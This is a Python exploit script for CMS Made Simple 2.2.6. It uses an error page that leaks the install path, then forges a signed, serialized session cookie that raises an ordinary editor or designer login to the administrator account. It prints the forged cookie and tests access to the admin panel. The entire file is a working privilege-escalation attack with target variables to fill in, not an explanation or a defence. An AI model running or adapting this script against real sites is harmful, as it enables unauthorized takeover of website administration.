#!encoding=utf-8
import requests#you need install this module
import re
import md5
import urllib
import base64
import hashlib
import phpserialize#pip install phpserialize
from bs4 import BeautifulSoup#you need install this module

domian='http://127.0.0.1:8001' #Important variable,change it to your value
version='2.2.6' #Important variable,change it to your value
ip='127.0.0.1' #Important variable,change it to your value
#Important variable,change it to your value
user_agent='Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.104 Safari/537.36 Core/1.53.4295.400 QQBrowser/9.7.12661.400'
username='test1' #Important variable,change it to your value Normal dashboard user
password='a123123'#password

url=domian+'/lib/tasks/class.CmsSecurityCheck.task.php'
res=requests.get(url=url)
if res.content:
	try:
		path=re.findall(r"in <b>(.*?)lib\\tasks\\class.CmsSecurityCheck.task.php",res.content)[0]
	except:
		print 'maybe url error'
		exit()
else:
	print 'network error'
	exit()
realpath=path+'lib\classes\internal\class.LoginOperations.php'+'CMSMS\LoginOperations'+version

m1 = md5.new()   
m1.update(realpath)  
#cookies name
cookies_title=m1.hexdigest() 

#unserialize pass now

#Escalate from editor user or designer user to admin
admin_login_url=domian+'/admin/login.php'
headers={ "User-Agent":user_agent,"Referer":admin_login_url}
print 'Requesting the following page:'+admin_login_url
print 'Please wait for a moment...'
print
postData={'username': username,'password': password,'loginsubmit': 'loginsubmit'}
user_login=requests.Session()
#account login to get some value
try:
	user_login.post(admin_login_url,data = postData,headers = headers)
	cookie_cksum=re.findall(r's:40:"(.*?)";}',base64.b64decode(urllib.unquote(user_login.cookies[cookies_title]).split('::')[1]))
except:
	print 'error'
	exit()

m2 = md5.new()
m2.update(path+'lib\classes\internal\class.LoginOperations.php')
temp_data_1=m2.hexdigest()
salt_data=[temp_data_1,ip,user_agent+version]
salt=hashlib.sha1(phpserialize.dumps(salt_data)).hexdigest()
make_data=base64.b64encode(phpserialize.dumps({'uid':1,'uid':2,'username':'admin','eff_uid':1,'eff_username':None,'cksum':cookie_cksum[0]}))
hash=hashlib.sha1(make_data+salt).hexdigest()#cookies value

test_admin_page=domian+'/admin/myaccount.php?_sk_=aabbcc'
test_admin_cookies={'_sk_':'aabbcc',cookies_title:hash+'::'+make_data}

print 'OK'
print 'Please empty the cookie and add the following cookie:'
print 
print cookies_title+'--->'+hash+'::'+make_data
print '_sk_'+'-->'+'aabbcc'
print
print 'Access after adding cookies:'+domian+'/admin/index.php'
print
print 'Try to log in to the admin account'
print
try:
	res=requests.get(url=test_admin_page,headers=headers,cookies=test_admin_cookies)
	content=re.findall(r'<span class="admin-title">(.*?)</span>',res.text)[0]
	print 'Of course,now you are admin:'+content
except:
	print 'error'